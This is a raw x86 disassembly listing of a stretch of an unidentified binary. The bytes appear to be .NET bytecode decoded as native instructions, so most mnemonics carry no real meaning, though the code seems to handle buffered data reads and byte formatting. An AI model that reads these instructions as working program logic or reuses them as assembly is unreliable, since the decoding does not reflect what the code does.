  402ba3:	0a 28                	or     (%eax),%ch
  402ba5:	11 00                	adc    %eax,(%eax)
  402ba7:	00 06                	add    %al,(%esi)
  402ba9:	28 08                	sub    %cl,(%eax)
  402bab:	00 00                	add    %al,(%eax)
  402bad:	06                   	push   %es
  402bae:	28 0a                	sub    %cl,(%edx)
  402bb0:	00 00                	add    %al,(%eax)
  402bb2:	06                   	push   %es
  402bb3:	28 0e                	sub    %cl,(%esi)
  402bb5:	00 00                	add    %al,(%eax)
  402bb7:	06                   	push   %es
  402bb8:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402bbe:	69 14 fe 06 1d 00 00 	imul   $0x1d06,(%esi,%edi,8),%edx
  402bc5:	06                   	push   %es
  402bc6:	73 3c                	jae    0x402c04
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402bcd:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402bd2:	2b 06                	sub    (%esi),%eax
  402bd4:	16                   	push   %ss
  402bd5:	28 13                	sub    %dl,(%ebx)
  402bd7:	00 00                	add    %al,(%eax)
  402bd9:	06                   	push   %es
  402bda:	de 09                	fimuls (%ecx)
  402bdc:	26 16                	es push %ss
  402bde:	28 13                	sub    %dl,(%ebx)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	06                   	push   %es
  402be3:	de 00                	fiadds (%eax)
  402be5:	2a 00                	sub    (%eax),%al
  402be7:	00 41 4c             	add    %al,0x4c(%ecx)
  402bea:	00 00                	add    %al,(%eax)
  402bec:	00 00                	add    %al,(%eax)
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	c4 00                	les    (%eax),%eax
  402bf2:	00 00                	add    %al,(%eax)
  402bf4:	20 00                	and    %al,(%eax)
  402bf6:	00 00                	add    %al,(%eax)
  402bf8:	e4 00                	in     $0x0,%al
  402bfa:	00 00                	add    %al,(%eax)
  402bfc:	03 00                	add    (%eax),%eax
  402bfe:	00 00                	add    %al,(%eax)
  402c00:	01 00                	add    %eax,(%eax)
  402c02:	00 01                	add    %al,(%ecx)
  402c04:	02 00                	add    (%eax),%al
  402c06:	00 00                	add    %al,(%eax)
  402c08:	0e                   	push   %cs
  402c09:	01 00                	add    %eax,(%eax)
  402c0b:	00 77 00             	add    %dh,0x0(%edi)
  402c0e:	00 00                	add    %al,(%eax)
  402c10:	85 01                	test   %eax,(%ecx)
  402c12:	00 00                	add    %al,(%eax)
  402c14:	0c 00                	or     $0x0,%al
	...
  402c22:	00 00                	add    %al,(%eax)
  402c24:	94                   	xchg   %eax,%esp
  402c25:	02 00                	add    (%eax),%al
  402c27:	00 94 02 00 00 09 00 	add    %dl,0x90000(%edx,%eax,1)
  402c2e:	00 00                	add    %al,(%eax)
  402c30:	01 00                	add    %eax,(%eax)
  402c32:	00 01                	add    %al,(%ecx)
  402c34:	1b 30                	sbb    (%eax),%esi
  402c36:	02 00                	add    (%eax),%al
  402c38:	46                   	inc    %esi
  402c39:	00 00                	add    %al,(%eax)
  402c3b:	00 00                	add    %al,(%eax)
  402c3d:	00 00                	add    %al,(%eax)
  402c3f:	00 28                	add    %ch,(%eax)
  402c41:	15 00 00 06 25       	adc    $0x25060000,%eax
  402c46:	2d 03 26 2b 05       	sub    $0x52b2603,%eax
  402c4b:	28 40 00             	sub    %al,0x0(%eax)
  402c4e:	00 0a                	add    %cl,(%edx)
  402c50:	28 10                	sub    %dl,(%eax)
  402c52:	00 00                	add    %al,(%eax)
  402c54:	06                   	push   %es
  402c55:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402c5a:	05 28 40 00 00       	add    $0x4028,%eax
  402c5f:	0a 28                	or     (%eax),%ch
  402c61:	08 00                	or     %al,(%eax)
  402c63:	00 06                	add    %al,(%esi)
  402c65:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402c6a:	05 28 41 00 00       	add    $0x4128,%eax
  402c6f:	0a 28                	or     (%eax),%ch
  402c71:	06                   	push   %es
  402c72:	00 00                	add    %al,(%eax)
  402c74:	06                   	push   %es
  402c75:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402c7a:	05 28 42 00 00       	add    $0x4228,%eax
  402c7f:	0a de                	or     %dh,%bl
  402c81:	03 26                	add    (%esi),%esp
  402c83:	de 00                	fiadds (%eax)
  402c85:	2a 00                	sub    (%eax),%al
  402c87:	00 01                	add    %al,(%ecx)
  402c89:	10 00                	adc    %al,(%eax)
  402c8b:	00 00                	add    %al,(%eax)
  402c8d:	00 00                	add    %al,(%eax)
  402c8f:	00 42 42             	add    %al,0x42(%edx)
  402c92:	00 03                	add    %al,(%ebx)
  402c94:	01 00                	add    %eax,(%eax)
  402c96:	00 01                	add    %al,(%ecx)
  402c98:	1b 30                	sbb    (%eax),%esi
  402c9a:	06                   	push   %es
  402c9b:	00 96 01 00 00 04    	add    %dl,0x4000001(%esi)
  402ca1:	00 00                	add    %al,(%eax)
  402ca3:	11 28                	adc    %ebp,(%eax)
  402ca5:	06                   	push   %es
  402ca6:	00 00                	add    %al,(%eax)
  402ca8:	06                   	push   %es
  402ca9:	6f                   	outsl  %ds:(%esi),(%dx)
  402caa:	2c 00                	sub    $0x0,%al
  402cac:	00 0a                	add    %cl,(%edx)
  402cae:	2c 07                	sub    $0x7,%al
  402cb0:	28 12                	sub    %dl,(%edx)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	06                   	push   %es
  402cb5:	2d 0b 16 28 13       	sub    $0x1328160b,%eax
  402cba:	00 00                	add    %al,(%eax)
  402cbc:	06                   	push   %es
  402cbd:	dd 77 01             	fnsave 0x1(%edi)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	28 08                	sub    %cl,(%eax)
  402cc4:	00 00                	add    %al,(%eax)
  402cc6:	06                   	push   %es
  402cc7:	02 6f 43             	add    0x43(%edi),%ch
  402cca:	00 00                	add    %al,(%eax)
  402ccc:	0a 0a                	or     (%edx),%cl
  402cce:	06                   	push   %es
  402ccf:	16                   	push   %ss
  402cd0:	3e 53                	ds push %ebx
  402cd2:	01 00                	add    %eax,(%eax)
  402cd4:	00 28                	add    %ch,(%eax)
  402cd6:	0e                   	push   %cs
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	06                   	push   %es
  402cda:	06                   	push   %es
  402cdb:	6a 58                	push   $0x58
  402cdd:	28 0f                	sub    %cl,(%edi)
  402cdf:	00 00                	add    %al,(%eax)
  402ce1:	06                   	push   %es
  402ce2:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402ce5:	00 06                	add    %al,(%esi)
  402ce7:	06                   	push   %es
  402ce8:	6a 59                	push   $0x59
  402cea:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402cf0:	0c 00                	or     $0x0,%al
  402cf2:	00 06                	add    %al,(%esi)
  402cf4:	3a f3                	cmp    %bl,%dh
  402cf6:	00 00                	add    %al,(%eax)
  402cf8:	00 28                	add    %ch,(%eax)
  402cfa:	0a 00                	or     (%eax),%al
  402cfc:	00 06                	add    %al,(%esi)
  402cfe:	16                   	push   %ss
  402cff:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402d03:	0a 6a 28             	or     0x28(%edx),%ch
  402d06:	0d 00 00 06 28       	or     $0x28060000,%eax
  402d0b:	0c 00                	or     $0x0,%al
  402d0d:	00 06                	add    %al,(%esi)
  402d0f:	16                   	push   %ss
  402d10:	6a 3e                	push   $0x3e
  402d12:	b6 00                	mov    $0x0,%dh
  402d14:	00 00                	add    %al,(%eax)
  402d16:	16                   	push   %ss
  402d17:	6a 28                	push   $0x28
  402d19:	0f 00 00             	sldt   (%eax)
  402d1c:	06                   	push   %es
  402d1d:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d20:	00 06                	add    %al,(%esi)
  402d22:	d4 8d                	aam    $0x8d
  402d24:	44                   	inc    %esp
  402d25:	00 00                	add    %al,(%eax)
  402d27:	01 28                	add    %ebp,(%eax)
  402d29:	0b 00                	or     (%eax),%eax
  402d2b:	00 06                	add    %al,(%esi)
  402d2d:	2b 59 28             	sub    0x28(%ecx),%ebx
  402d30:	08 00                	or     %al,(%eax)
  402d32:	00 06                	add    %al,(%esi)
  402d34:	28 0a                	sub    %cl,(%edx)
  402d36:	00 00                	add    %al,(%eax)
  402d38:	06                   	push   %es
  402d39:	28 0e                	sub    %cl,(%esi)
  402d3b:	00 00                	add    %al,(%eax)
  402d3d:	06                   	push   %es
  402d3e:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402d44:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402d4b:	07                   	pop    %es
  402d4c:	16                   	push   %ss
  402d4d:	30 0b                	xor    %cl,(%ebx)
  402d4f:	16                   	push   %ss
  402d50:	28 13                	sub    %dl,(%ebx)
  402d52:	00 00                	add    %al,(%eax)
  402d54:	06                   	push   %es
  402d55:	dd df                	fstp   %st(7)
  402d57:	00 00                	add    %al,(%eax)
  402d59:	00 28                	add    %ch,(%eax)
  402d5b:	0e                   	push   %cs
  402d5c:	00 00                	add    %al,(%eax)
  402d5e:	06                   	push   %es
  402d5f:	07                   	pop    %es
  402d60:	6a 58                	push   $0x58
  402d62:	28 0f                	sub    %cl,(%edi)
  402d64:	00 00                	add    %al,(%eax)
  402d66:	06                   	push   %es
  402d67:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d6a:	00 06                	add    %al,(%esi)
  402d6c:	07                   	pop    %es
  402d6d:	6a 59                	push   $0x59
  402d6f:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d75:	0c 00                	or     $0x0,%al
  402d77:	00 06                	add    %al,(%esi)
  402d79:	16                   	push   %ss
  402d7a:	6a 2f                	push   $0x2f
  402d7c:	0b 16                	or     (%esi),%edx
  402d7e:	28 13                	sub    %dl,(%ebx)
  402d80:	00 00                	add    %al,(%eax)
  402d82:	06                   	push   %es
  402d83:	dd b1 00 00 00 28    	fnsave 0x28000000(%ecx)
  402d89:	0c 00                	or     $0x0,%al
  402d8b:	00 06                	add    %al,(%esi)
  402d8d:	16                   	push   %ss
  402d8e:	6a 30                	push   $0x30
  402d90:	9e                   	sahf
  402d91:	14 fe                	adc    $0xfe,%al
  402d93:	06                   	push   %es
  402d94:	92                   	xchg   %eax,%edx
  402d95:	00 00                	add    %al,(%eax)
  402d97:	06                   	push   %es
  402d98:	73 46                	jae    0x402de0
  402d9a:	00 00                	add    %al,(%eax)
  402d9c:	0a 73 47             	or     0x47(%ebx),%dh
  402d9f:	00 00                	add    %al,(%eax)
  402da1:	0a 28                	or     (%eax),%ch
  402da3:	0a 00                	or     (%eax),%al
  402da5:	00 06                	add    %al,(%esi)
  402da7:	6f                   	outsl  %ds:(%esi),(%dx)
  402da8:	48                   	dec    %eax
  402da9:	00 00                	add    %al,(%eax)
  402dab:	0a 16                	or     (%esi),%dl
  402dad:	6a 28                	push   $0x28
  402daf:	0f 00 00             	sldt   (%eax)
  402db2:	06                   	push   %es
  402db3:	1a 6a 28             	sbb    0x28(%edx),%ch
  402db6:	0d 00 00 06 28       	or     $0x28060000,%eax
  402dbb:	0c 00                	or     $0x0,%al
  402dbd:	00 06                	add    %al,(%esi)
  402dbf:	d4 8d                	aam    $0x8d
  402dc1:	44                   	inc    %esp
  402dc2:	00 00                	add    %al,(%eax)
  402dc4:	01 28                	add    %ebp,(%eax)
  402dc6:	0b 00                	or     (%eax),%eax
  402dc8:	00 06                	add    %al,(%esi)
  402dca:	2b 31                	sub    (%ecx),%esi
  402dcc:	1a 6a 28             	sbb    0x28(%edx),%ch
  402dcf:	0d 00 00 06 28       	or     $0x28060000,%eax
  402dd4:	0c 00                	or     $0x0,%al
  402dd6:	00 06                	add    %al,(%esi)
  402dd8:	d4 8d                	aam    $0x8d
  402dda:	44                   	inc    %esp
  402ddb:	00 00                	add    %al,(%eax)
  402ddd:	01 28                	add    %ebp,(%eax)
  402ddf:	0b 00                	or     (%eax),%eax
  402de1:	00 06                	add    %al,(%esi)
  402de3:	16                   	push   %ss
  402de4:	6a 28                	push   $0x28
  402de6:	0f 00 00             	sldt   (%eax)
  402de9:	06                   	push   %es
  402dea:	2b 11                	sub    (%ecx),%edx
  402dec:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402def:	00 06                	add    %al,(%esi)
  402df1:	16                   	push   %ss
  402df2:	6a 2f                	push   $0x2f
  402df4:	08 16                	or     %dl,(%esi)
  402df6:	28 13                	sub    %dl,(%ebx)
  402df8:	00 00                	add    %al,(%eax)
  402dfa:	06                   	push   %es
  402dfb:	de 3c 28             	fidivrs (%eax,%ebp,1)
  402dfe:	08 00                	or     %al,(%eax)
  402e00:	00 06                	add    %al,(%esi)
  402e02:	28 0a                	sub    %cl,(%edx)
  402e04:	00 00                	add    %al,(%eax)
  402e06:	06                   	push   %es
  402e07:	28 0e                	sub    %cl,(%esi)
  402e09:	00 00                	add    %al,(%eax)
  402e0b:	06                   	push   %es
  402e0c:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402e12:	69 14 fe 06 1d 00 00 	imul   $0x1d06,(%esi,%edi,8),%edx
  402e19:	06                   	push   %es
  402e1a:	73 3c                	jae    0x402e58
  402e1c:	00 00                	add    %al,(%eax)
  402e1e:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402e21:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402e26:	2b 06                	sub    (%esi),%eax
  402e28:	16                   	push   %ss
  402e29:	28 13                	sub    %dl,(%ebx)
  402e2b:	00 00                	add    %al,(%eax)
  402e2d:	06                   	push   %es
  402e2e:	de 09                	fimuls (%ecx)
  402e30:	26 16                	es push %ss
  402e32:	28 13                	sub    %dl,(%ebx)
  402e34:	00 00                	add    %al,(%eax)
  402e36:	06                   	push   %es
  402e37:	de 00                	fiadds (%eax)
  402e39:	2a 00                	sub    (%eax),%al
  402e3b:	00 41 1c             	add    %al,0x1c(%ecx)
	...
  402e46:	00 00                	add    %al,(%eax)
  402e48:	8c 01                	mov    %es,(%ecx)
  402e4a:	00 00                	add    %al,(%eax)
  402e4c:	8c 01                	mov    %es,(%ecx)
  402e4e:	00 00                	add    %al,(%eax)
  402e50:	09 00                	or     %eax,(%eax)
  402e52:	00 00                	add    %al,(%eax)
  402e54:	01 00                	add    %eax,(%eax)
  402e56:	00 01                	add    %al,(%ecx)
  402e58:	1b 30                	sbb    (%eax),%esi
  402e5a:	04 00                	add    $0x0,%al
  402e5c:	e5 00                	in     $0x0,%eax
  402e5e:	00 00                	add    %al,(%eax)
  402e60:	05 00 00 11 28       	add    $0x28110000,%eax
  402e65:	14 00                	adc    $0x0,%al
  402e67:	00 06                	add    %al,(%esi)
  402e69:	0a 16                	or     (%esi),%dl
  402e6b:	0b 06                	or     (%esi),%eax
  402e6d:	12 01                	adc    (%ecx),%al
  402e6f:	28 49 00             	sub    %cl,0x0(%ecx)
  402e72:	00 0a                	add    %cl,(%edx)
  402e74:	28 12                	sub    %dl,(%edx)
  402e76:	00 00                	add    %al,(%eax)
  402e78:	06                   	push   %es
  402e79:	2c 03                	sub    $0x3,%al
  402e7b:	02 2d 05 dd c5 00    	add    0xc5dd05,%ch
  402e81:	00 00                	add    %al,(%eax)
  402e83:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402e89:	00 0a                	add    %cl,(%edx)
  402e8b:	0c 28                	or     $0x28,%al
  402e8d:	06                   	push   %es
  402e8e:	00 00                	add    %al,(%eax)
  402e90:	06                   	push   %es
  402e91:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402e96:	00 0a                	add    %cl,(%edx)
  402e98:	26 28 08             	sub    %cl,%es:(%eax)
  402e9b:	00 00                	add    %al,(%eax)
  402e9d:	06                   	push   %es
  402e9e:	08 16                	or     %dl,(%esi)
  402ea0:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402ea6:	00 0a                	add    %cl,(%edx)
  402ea8:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402eae:	0f 00                	(bad)
  402eb0:	31 5b 02             	xor    %ebx,0x2(%ebx)
  402eb3:	73 4d                	jae    0x402f02
  402eb5:	00 00                	add    %al,(%eax)
  402eb7:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402ebd:	16                   	push   %ss
  402ebe:	6a 6f                	push   $0x6f
  402ec0:	4e                   	dec    %esi
  402ec1:	00 00                	add    %al,(%eax)
  402ec3:	0a 20                	or     (%eax),%ah
  402ec5:	50                   	push   %eax
  402ec6:	c3                   	ret
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402ecd:	01 13                	add    %edx,(%ebx)
  402ecf:	05 2b 1c 28 06       	add    $0x6281c2b,%eax
  402ed4:	00 00                	add    %al,(%eax)
  402ed6:	06                   	push   %es
  402ed7:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402edc:	00 0a                	add    %cl,(%edx)
  402ede:	26 28 08             	sub    %cl,%es:(%eax)
  402ee1:	00 00                	add    %al,(%eax)
  402ee3:	06                   	push   %es
  402ee4:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402eea:	4c                   	dec    %esp
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	0a 09                	or     (%ecx),%cl
  402eef:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402ef5:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402efc:	13 04 16             	adc    (%esi,%edx,1),%eax
  402eff:	30 d1                	xor    %dl,%cl
  402f01:	de 30                	fidivs (%eax)
  402f03:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  402f06:	09 6f 33             	or     %ebp,0x33(%edi)
  402f09:	00 00                	add    %al,(%eax)
  402f0b:	0a dc                	or     %ah,%bl
  402f0d:	28 06                	sub    %al,(%esi)
  402f0f:	00 00                	add    %al,(%eax)
  402f11:	06                   	push   %es
  402f12:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f17:	00 0a                	add    %cl,(%edx)
  402f19:	26 28 08             	sub    %cl,%es:(%eax)
  402f1c:	00 00                	add    %al,(%eax)
  402f1e:	06                   	push   %es
  402f1f:	02 16                	add    (%esi),%dl
  402f21:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  402f27:	00 0a                	add    %cl,(%edx)
  402f29:	28 08                	sub    %cl,(%eax)
  402f2b:	00 00                	add    %al,(%eax)
  402f2d:	06                   	push   %es
  402f2e:	6f                   	outsl  %ds:(%esi),(%dx)
  402f2f:	4f                   	dec    %edi
  402f30:	00 00                	add    %al,(%eax)
  402f32:	0a de                	or     %dh,%bl
  402f34:	13 26                	adc    (%esi),%esp
  402f36:	16                   	push   %ss
  402f37:	28 13                	sub    %dl,(%ebx)
  402f39:	00 00                	add    %al,(%eax)
  402f3b:	06                   	push   %es
  402f3c:	de 0a                	fimuls (%edx)
  402f3e:	07                   	pop    %es
  402f3f:	2c 06                	sub    $0x6,%al
  402f41:	06                   	push   %es
  402f42:	28 50 00             	sub    %dl,0x0(%eax)
  402f45:	00 0a                	add    %cl,(%edx)
  402f47:	dc 2a                	fsubrl (%edx)
  402f49:	00 00                	add    %al,(%eax)
  402f4b:	00 01                	add    %al,(%ecx)
  402f4d:	28 00                	sub    %al,(%eax)
  402f4f:	00 02                	add    %al,(%edx)
  402f51:	00 55 00             	add    %dl,0x0(%ebp)
  402f54:	4a                   	dec    %edx
  402f55:	9f                   	lahf
  402f56:	00 0a                	add    %cl,(%edx)
  402f58:	00 00                	add    %al,(%eax)
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	00 00                	add    %al,(%eax)
  402f5e:	10 00                	adc    %al,(%eax)
  402f60:	c1 d1 00             	rcl    $0x0,%ecx
  402f63:	09 01                	or     %eax,(%ecx)
  402f65:	00 00                	add    %al,(%eax)
  402f67:	01 02                	add    %eax,(%edx)
  402f69:	00 08                	add    %cl,(%eax)
  402f6b:	00 d2                	add    %dl,%dl
  402f6d:	da 00                	fiaddl (%eax)
  402f6f:	0a 00                	or     (%eax),%al
  402f71:	00 00                	add    %al,(%eax)
  402f73:	00 13                	add    %dl,(%ebx)
  402f75:	30 05 00 86 00 00    	xor    %al,0x8600
  402f7b:	00 00                	add    %al,(%eax)
  402f7d:	00 00                	add    %al,(%eax)
  402f7f:	00 73 62             	add    %dh,0x62(%ebx)
  402f82:	00 00                	add    %al,(%eax)
  402f84:	06                   	push   %es
  402f85:	25 72 81 20 00       	and    $0x208172,%eax
  402f8a:	70 6f                	jo     0x402ffb
  402f8c:	4d                   	dec    %ebp
  402f8d:	00 00                	add    %al,(%eax)
  402f8f:	06                   	push   %es
  402f90:	72 8f                	jb     0x402f21
  402f92:	20 00                	and    %al,(%eax)
  402f94:	70 6f                	jo     0x403005
  402f96:	5a                   	pop    %edx
  402f97:	00 00                	add    %al,(%eax)
  402f99:	06                   	push   %es
  402f9a:	25 72 99 20 00       	and    $0x209972,%eax
  402f9f:	70 6f                	jo     0x403010
  402fa1:	4d                   	dec    %ebp
  402fa2:	00 00                	add    %al,(%eax)
  402fa4:	06                   	push   %es
  402fa5:	72 a9                	jb     0x402f50
  402fa7:	20 00                	and    %al,(%eax)
  402fa9:	70 7e                	jo     0x403029
  402fab:	10 00                	adc    %al,(%eax)
  402fad:	00 04 28             	add    %al,(%eax,%ebp,1)
  402fb0:	8e 00                	mov    (%eax),%es
  402fb2:	00 06                	add    %al,(%esi)
  402fb4:	25 2d 06 26 72       	and    $0x7226062d,%eax
  402fb9:	b7 20                	mov    $0x20,%bh
  402fbb:	00 70 28             	add    %dh,0x28(%eax)
  402fbe:	51                   	push   %ecx
  402fbf:	00 00                	add    %al,(%eax)
  402fc1:	0a 6f 5a             	or     0x5a(%edi),%ch
  402fc4:	00 00                	add    %al,(%eax)
  402fc6:	06                   	push   %es
  402fc7:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc8:	57                   	push   %edi
  402fc9:	00 00                	add    %al,(%eax)
  402fcb:	06                   	push   %es
  402fcc:	28 1e                	sub    %bl,(%esi)
  402fce:	00 00                	add    %al,(%eax)
  402fd0:	06                   	push   %es
  402fd1:	28 15 00 00 06 25    	sub    %dl,0x25060000
  402fd7:	2d 03 26 2b 05       	sub    $0x52b2603,%eax
  402fdc:	28 40 00             	sub    %al,0x0(%eax)
  402fdf:	00 0a                	add    %cl,(%edx)
  402fe1:	16                   	push   %ss
  402fe2:	28 18                	sub    %bl,(%eax)
  402fe4:	00 00                	add    %al,(%eax)
  402fe6:	06                   	push   %es
  402fe7:	14 fe                	adc    $0xfe,%al
  402fe9:	06                   	push   %es
  402fea:	20 00                	and    %al,(%eax)
  402fec:	00 06                	add    %al,(%esi)
  402fee:	73 3a                	jae    0x40302a
  402ff0:	00 00                	add    %al,(%eax)
  402ff2:	0a 14 17             	or     (%edi,%edx,1),%dl
  402ff5:	17                   	pop    %ss
  402ff6:	73 3b                	jae    0x403033
  402ff8:	00 00                	add    %al,(%eax)
  402ffa:	0a 28                	or     (%eax),%ch
  402ffc:	16                   	push   %ss
  402ffd:	00 00                	add    %al,(%eax)
  402fff:	06                   	push   %es
  403000:	28 52 00             	sub    %dl,0x0(%edx)
  403003:	00 0a                	add    %cl,(%edx)
  403005:	2a 00                	sub    (%eax),%al
  403007:	00 13                	add    %dl,(%ebx)
  403009:	30 03                	xor    %al,(%ebx)
  40300b:	00 38                	add    %bh,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	00 06                	add    %al,(%esi)
  403011:	00 00                	add    %al,(%eax)
  403013:	11 73 53             	adc    %esi,0x53(%ebx)
  403016:	00 00                	add    %al,(%eax)
  403018:	0a 0a                	or     (%edx),%cl
  40301a:	02 0b                	add    (%ebx),%cl
  40301c:	16                   	push   %ss
  40301d:	0c 2b                	or     $0x2b,%al
  40301f:	1f                   	pop    %ds
  403020:	07                   	pop    %es
  403021:	08 91 0d 06 72 bb    	or     %dl,-0x448df9f3(%ecx)
  403027:	20 00                	and    %al,(%eax)
  403029:	70 09                	jo     0x403034
  40302b:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  40302f:	01 28                	add    %ebp,(%eax)
  403031:	54                   	push   %esp
  403032:	00 00                	add    %al,(%eax)
  403034:	0a 6f 55             	or     0x55(%edi),%ch
  403037:	00 00                	add    %al,(%eax)
  403039:	0a 26                	or     (%esi),%ah
  40303b:	08 17                	or     %dl,(%edi)
  40303d:	58                   	pop    %eax
  40303e:	0c 08                	or     $0x8,%al
  403040:	07                   	pop    %es
  403041:	8e 69 32             	mov    0x32(%ecx),%gs
  403044:	db 06                	fildl  (%esi)
  403046:	6f                   	outsl  %ds:(%esi),(%dx)
  403047:	38 00                	cmp    %al,(%eax)
  403049:	00 0a                	add    %cl,(%edx)
  40304b:	2a 13                	sub    (%ebx),%dl
  40304d:	30 03                	xor    %al,(%ebx)
  40304f:	00 38                	add    %bh,(%eax)
  403051:	00 00                	add    %al,(%eax)
  403053:	00 06                	add    %al,(%esi)
  403055:	00 00                	add    %al,(%eax)
  403057:	11 73 53             	adc    %esi,0x53(%ebx)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	0a 0a                	or     (%edx),%cl
  40305e:	02 0b                	add    (%ebx),%cl
  403060:	16                   	push   %ss
  403061:	0c 2b                	or     $0x2b,%al
  403063:	1f                   	pop    %ds
  403064:	07                   	pop    %es
  403065:	08 91 0d 06 72 cb    	or     %dl,-0x348df9f3(%ecx)
  40306b:	20 00                	and    %al,(%eax)
  40306d:	70 09                	jo     0x403078
  40306f:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  403073:	01 28                	add    %ebp,(%eax)
  403075:	54                   	push   %esp
  403076:	00 00                	add    %al,(%eax)
  403078:	0a 6f 55             	or     0x55(%edi),%ch
  40307b:	00 00                	add    %al,(%eax)
  40307d:	0a 26                	or     (%esi),%ah
  40307f:	08 17                	or     %dl,(%edi)
  403081:	58                   	pop    %eax
  403082:	0c 08                	or     $0x8,%al
  403084:	07                   	pop    %es
  403085:	8e 69 32             	mov    0x32(%ecx),%gs
  403088:	db 06                	fildl  (%esi)
  40308a:	6f                   	outsl  %ds:(%esi),(%dx)
  40308b:	38 00                	cmp    %al,(%eax)
  40308d:	00 0a                	add    %cl,(%edx)
  40308f:	2a 13                	sub    (%ebx),%dl
  403091:	30 04 00             	xor    %al,(%eax,%eax,1)
  403094:	29 00                	sub    %eax,(%eax)
  403096:	00 00                	add    %al,(%eax)
  403098:	07                   	pop    %es
  403099:	00 00                	add    %al,(%eax)
  40309b:	11 02                	adc    %eax,(%edx)
  40309d:	8e 69 8d             	mov    -0x73(%ecx),%gs
  4030a0:	44                   	inc    %esp
  4030a1:	00 00                	add    %al,(%eax)
  4030a3:	01 0a                	add    %ecx,(%edx)
  4030a5:	02 8e 69 17 59 0b    	add    0xb591769(%esi),%cl
  4030ab:	16                   	push   %ss
  4030ac:	0c 2b                	or     $0x2b,%al
  4030ae:	0e                   	push   %cs
  4030af:	06                   	push   %es
  4030b0:	08 02                	or     %al,(%edx)
  4030b2:	07                   	pop    %es
  4030b3:	91                   	xchg   %eax,%ecx
  4030b4:	9c                   	pushf
  4030b5:	07                   	pop    %es
  4030b6:	17                   	pop    %ss
  4030b7:	59                   	pop    %ecx
  4030b8:	0b 08                	or     (%eax),%ecx
  4030ba:	17                   	pop    %ss
  4030bb:	58                   	pop    %eax
  4030bc:	0c 08                	or     $0x8,%al
  4030be:	06                   	push   %es
  4030bf:	8e 69 32             	mov    0x32(%ecx),%gs
  4030c2:	ec                   	in     (%dx),%al
  4030c3:	06                   	push   %es
  4030c4:	2a 00                	sub    (%eax),%al
  4030c6:	00 00                	add    %al,(%eax)
  4030c8:	13 30                	adc    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	33 00                	xor    (%eax),%eax
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	01 00                	add    %eax,(%eax)
  4030d2:	00 11                	add    %dl,(%ecx)
  4030d4:	16                   	push   %ss
  4030d5:	0a 2b                	or     (%ebx),%ch
  4030d7:	15 02 7b 26 00       	adc    $0x267b02,%eax
  4030dc:	00 04 06             	add    %al,(%esi,%eax,1)
  4030df:	6f                   	outsl  %ds:(%esi),(%dx)
  4030e0:	59                   	pop    %ecx
  4030e1:	00 00                	add    %al,(%eax)
  4030e3:	0a 6f 39             	or     0x39(%edi),%ch
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	06                   	push   %es
  4030e9:	06                   	push   %es
  4030ea:	17                   	pop    %ss
  4030eb:	58                   	pop    %eax
  4030ec:	0a 06                	or     (%esi),%al
  4030ee:	02 7b 26             	add    0x26(%ebx),%bh
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	04 6f                	add    $0x6f,%al
  4030f5:	5a                   	pop    %edx
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	0a 32                	or     (%edx),%dh
  4030fa:	dd 02                	fldl   (%edx)
  4030fc:	7b 26                	jnp    0x403124
  4030fe:	00 00                	add    %al,(%eax)
  403100:	04 6f                	add    $0x6f,%al
  403102:	5c                   	pop    %esp
  403103:	00 00                	add    %al,(%eax)
  403105:	0a 2a                	or     (%edx),%ch
  403107:	00 13                	add    %dl,(%ebx)
  403109:	30 02                	xor    %al,(%edx)
  40310b:	00 1b                	add    %bl,(%ebx)
  40310d:	00 00                	add    %al,(%eax)
  40310f:	00 08                	add    %cl,(%eax)
  403111:	00 00                	add    %al,(%eax)
  403113:	11 73 62             	adc    %esi,0x62(%ebx)
  403116:	00 00                	add    %al,(%eax)
  403118:	06                   	push   %es
  403119:	0a 06                	or     (%esi),%al
